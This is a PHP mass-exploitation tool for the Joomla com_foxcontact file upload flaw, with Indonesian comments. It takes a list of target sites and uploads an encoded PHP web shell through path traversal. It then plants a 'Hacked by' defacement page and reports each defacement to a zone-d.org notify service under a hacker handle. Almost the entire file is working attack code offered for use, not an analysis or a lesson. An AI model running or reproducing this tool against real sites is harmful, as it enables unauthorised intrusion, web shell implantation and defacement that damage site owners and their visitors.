<?php
/**

Joomla Component com_foxcontact Arbitrary File Upload
https://cxsecurity.com/issue/WLB-2016050072

Auto Exploiter (Shell Upload, Auto Deface, and Auto Submit Zone -H)

*/

error_reporting(0);
set_time_limit(0);

Class IDX_Foxcontact {
	public  $url;
	private $file = [];

	/* Nick Hacker Kalian / Nick Zone -H Kalian */
	/* Pastikan dalam script deface kalian terdapat kata HACKED */
	private $hacker = "PhantomSec1337";

	/* script uploader, sebaiknya jangan di otak-atik */
	private $uploader  = 'R0lGODlhOw0KPGh0bWw+DQo8dGl0bGU+VXBsb2FkZXIgQnkgSW5kb1hwbG9pdCBCT1Q8L3RpdGxlPg0KPHA+PD9waHAgZWNobyAnPGI+Jy5waHBfdW5hbWUoKS4nPC9iPic7ID8+PGJyPg0KPD9waHAgZWNobyAnPGI+Jy5nZXRjd2QoKS4nPC9iPic7ID8+PC9wPg0KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdpZHhfZmlsZSc+DQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXBsb2FkJyBuYW1lPSd1cGxvYWQnPg0KPC9mb3JtPg0KPD9waHAgaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPk9LPC9iPl0nOyB9IGVsc2UgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPkZBSUxFRDwvYj4nOyB9IH0gPz4=';
		
	/* script deface, ubah bagian ini ke base64 script deface kalian */
	private $deface    = 'PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJQaGFudG9tIFNlY3VyaXR5IDEzMzcgIj4KPG1ldGEgbmFtZT0ia2V5d29yZCIgY29udGVudD0iU2VjdXJpdHkgRG93biAhISI+CjxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvcG5nIiBocmVmPSJodHRwczovL2kuaWJiLmNvL0tHeWtMQ1cvMjAyMDA3MDgtMDMzMjQ0LmpwZyIvPgo8dGl0bGU+SGFja2VkIGJ5IC4vTG9jYWx5emVyPC90aXRsZT4gPGxpbmsgaHJlZj0naHR0cDovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9SnVyYXxPcmJpdHJvbnxTaGFyZStUZWNoK01vbm8nIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSJodHRwOi8vMTQ5LjU2LjIyLjE5Mi9+bXJ4YmFyYWt1ZGEvc2NyaXB0Mi9lcnJvci5jc3MiPgo8L2hlYWQ+Cjxib2R5Pgo8Y2VudGVyPgo8dGFibGUgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJT4KPHRkIGFsaWduPWNlbnRlcj4KPGJvZHkgYmdjb2xvcj0iYmxhY2siPgo8Zm9udCBmYWNlPSJqdXJhIj48Zm9udCBzaXplPSIyMHB4IiBjb2xvcj13aGl0ZT48Yi1saW5rPgo8Zm9udCBjb2xvcj1yZWQ+SGFja2VkIEI8L2ZvbnQ+eSAuL0xvY2FseXplcjwvYmxpbms+CjwvZm9udD4KPGJyPgo8YnI+Cjxicj4KPGNlbnRlcj4KPGRpdiBjbGFzcz0ia3VkYXgiPgo8aW1nIHNyYz0iaHR0cHM6Ly9pLmliYi5jby8zMHJSQ2I0L0lNRy0yMDIwMDcwNi0wMTIwMTcuanBnIiB3aWR0aD0iMzAwIiBoZWlnaHQ9IjMwMCI+CjwvZGl2Pgo8L2NlbnRlcj4KPGJyPgo8Zm9udCBmYWNlPSJqdXJhIj48Zm9udCBzaXplPSI1IiBjb2xvcj13aGl0ZT4jIFBoYW50b20gU2VjdXJpdHkgMTMzNyBQYXJ0eSBXaXRoIE1lICM8L2ZvbnQ+Cjxicj4KPGJyPgo8YnI+Cjxmb250IGZhY2U9Imp1cmEiPjxmb250IHNpemU9IjUiIGNvbG9yPXdoaXRlPkdyZWV6dCA8aDU+PGZvbnQgY29sb3I9IndoaXRlIiBmYWNlPSJqdXJhIj4uLzB4cGwwMXQzciB+TDRub3JpYTQ1IH4gU25vcHVua3M0MDQgfiBFcmVyZWUqSWthIH4gQW5hcmNoeUdob3N0ICB+IFl1dWtpLnB5IH4gRXNzZXNDeWJlcjcgfiBUTi5SaXp6MjIgfiBBbCBDYXRyYXogfiAuL2tpdHN1bmUgfiBMM1QzUnpjeSB+IEJhZHN5bnRheCB+IENydXNoZXIgPGJyPgo8YnI+IEFQUklMTCB+IFplMkYgIH4gUml6a3kwNyB+IFJleDQgfiBaeCdQaG9lbml4ICAgfiBNUi40UEVBSkUgfiBpVGFjSGkgfiBJQ0hBIH4gVGV4N3VyZSB+IE5naW5kM3gucHkgfiBaZWVYX0lORCB+IFhlbm82aG9zdCB+IFZJTk4gfiByb290X1gxMzM3IDwvZm9udD4gPGJyPgo8YnI+CjxoNT48bWFycXVlZSBkaXJlY3Rpb249bGVmdCBiZWhhdmlvcj1hbHRlcm5hdGUgc2Nyb2xsYW1vdW50PSI1IiBzY3JvbGxkZWxheT0iNTAiIHdpZHRoPSI1MCUiPjxmb250IGNvbG9yPSJ3aGl0ZSIgZmFjZT0ianVyYSI+ID09PT09PT09IE9mZmljaWFsIE1lbWJlciBQaGFudG9tIFNlY3VyaXR5IDEzMzcgLSBQaGFudG9tIFNlY3VyaXR5IGludGVybmF0aW9uYWwgLSBBbm9uIFJveiBUZWFtIC0gQm9nb3IgQmxhY2toYXQgLSBIaWxsdXNpb24gRXhwbG9pdCBJRCB+IGlkaW90IEJsYWNraGF0IH4gaXNla2FpWHBsb2l0IH4gRGFyayBDbG93biBTZWN1cml0eSB+IENhbnRpeCBDcmV3IH4gUGhhbnRvbUdob3N0IH4gUGhhbnRvbVNlYzEzMzcgfiBBbGwgSW5kb25lc2lhbiBEZWZhY2VyID09PT09PT09IDwvZm9udD48L21hcnF1ZWU+Cjxicj4KPGJyPgo8aWZyYW1lIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIHNjcm9sbGluZz0ibm8iIGZyYW1lYm9yZGVyPSJubyIgYWxsb3c9ImF1dG9wbGF5IiBzcmM9Imh0dHBzOi8vZy50b3A0dG9wLmlvL21fMTU5MTRyb2dnMS5tcDMiPgo8Zm9udCBmYWNlPSJKdXJhIiBzaXplPSI0IiBjb2xvcj0icmVkIj4uL0xvY2FseXplcjwvZm9udD48Zm9udCBmYWNlPSJKdXJhIiBzaXplPSI0IiBjb2xvcj0id2hpdGUiPiAyMDIwPC9mb250PiA8L2NlbnRlcj4gPC9ib2R5PiA8L2hlYWQ+IDwvaHRtbD4=';

		 

	public function __construct() {
		$this->file = (object) $this->file;

		/* Nama file deface kalian */
		$this->file->deface 	= "016.html";

		$this->file->shell 		= $this->randomFileName().".php";
	}

	public function validUrl() {
		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
			$url = "http://".$this->url;
			return $url;
		} else {
			return $this->url;
		}
	}

	public function randomFileName() {
		$characters = implode("", range(0,9)).implode("", range("A","Z")).implode("", range("a","z"));
		$generate   = substr(str_shuffle($characters), 0, rand(4, 8));

		$prefixFilename = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74"."_";
		return $prefixFilename.$generate;
	}

	public function curl($url, $data = null, $headers = null, $cookie = true) {
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
			  curl_setopt($ch, CURLOPT_URL, $url);
			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		if($data !== null) {
			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			  curl_setopt($ch, CURLOPT_POST, TRUE);
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}

		if($headers !== null) {
			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($cookie === true) {
			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		}

		$exec = curl_exec($ch);
		$info = curl_getinfo($ch);

			  curl_close($ch);

		return (object) [
			"response" 	=> $exec,
			"info"		=> $info
		];

	}

	public function getId() {
		$url 		= $this->url;
		$getContent = $this->curl($url)->response;
		preg_match_all("/<a name=\"cid_(.*?)\">/", $getContent, $cid);
		preg_match_all("/<a name=\"mid_(.*?)\">/", $getContent, $mid);

		return (object) [
			"cid" => ($cid[1][0] === NULL ? 0 : $cid[1][0]),
			"mid" => ($mid[1][0] === NULL ? 0 : $mid[1][0]),
		];
	}

	public function exploit() {
		$getCid = $this->getId()->cid;
		$getMid = $this->getId()->mid;

		$url	= (object) parse_url($this->url);

		$headers = [
			"X-Requested-With: XMLHttpRequest",
			"X-File-Name: ".$this->file->shell,
			"Content-Type: image/jpeg"
		];

		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->uploader), $headers);
		}

		$shell = $url->scheme."://".$url->host."/components/com_foxcontact/".$this->file->shell;
		$check = $this->curl($shell)->response;
		if(preg_match("/Uploader By IndoXploit BOT/i", $check)) {
			print "[+] Shell OK: ".$shell."\n";
			$this->save($shell);
		} else {
			print "[-] Shell Failed\n";
		}
		
		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->deface), $headers);
		}

		$deface = $url->scheme."://".$url->host."/".$this->file->deface;
		$check = $this->curl($deface)->response;
		if(preg_match("/hacked/i", $check)) {
			print "[+] Deface OK: ".$deface."\n";
			$this->zoneh($deface);
			$this->save($deface);
		} else {
			print "[-] Deface Failed\n";
		}
	}

	public function zoneh($url) {
		$post = $this->curl("https://zone-d.org/notify", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);
		if(preg_match("/color=\"red\">(.*?)<\/font><\/li>/i", $post->response, $matches)) {
			if($matches[1] === "ERROR") {
				preg_match("/<font color=\"red\">ERROR:<br\/>(.*?)<br\/>/i", $post->response, $matches2);
				print "[-] Zone-D ($url) [ERROR: ".$matches2[1]."]\n\n";
			} else {
				print "[+] Zone-D ($url) [OK]\n\n";
			}
		}
	}

	public function save($isi) {
		$handle = fopen("result.txt", "a+");
		fwrite($handle, "$isi\n");
		fclose($handle);
	}
} 	

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
$open = explode("\n", file_get_contents($argv[1]));

foreach($open as $list) {
	$fox = new IDX_Foxcontact();
	$fox->url = trim($list);
	$fox->url = $fox->validUrl();

	print "[*] Exploiting ".parse_url($fox->url, PHP_URL_HOST)."\n";
	$fox->exploit();
}
